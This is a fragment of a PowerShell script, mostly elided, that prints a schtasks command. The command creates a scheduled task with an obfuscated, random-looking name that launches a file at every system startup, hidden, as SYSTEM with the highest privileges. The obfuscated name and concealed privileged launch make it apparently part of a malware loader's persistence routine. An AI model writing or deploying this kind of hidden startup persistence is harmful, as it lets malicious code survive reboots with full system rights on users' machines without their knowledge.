    ...
    try {
        ...
        if ($isAdmin) {
            ...
            if (-not $taskSuccess) {
                ...
                Write-Host "schtasks /create /tn `"$TksdaoqawopqwNisadnia`" /tr `"powershell.exe -Command `"Start-Process '$caminhoCompleto' -WindowStyle Hidden`"`" /sc onstart /ru SYSTEM /rl HIGHEST /f"
            }
        } else {
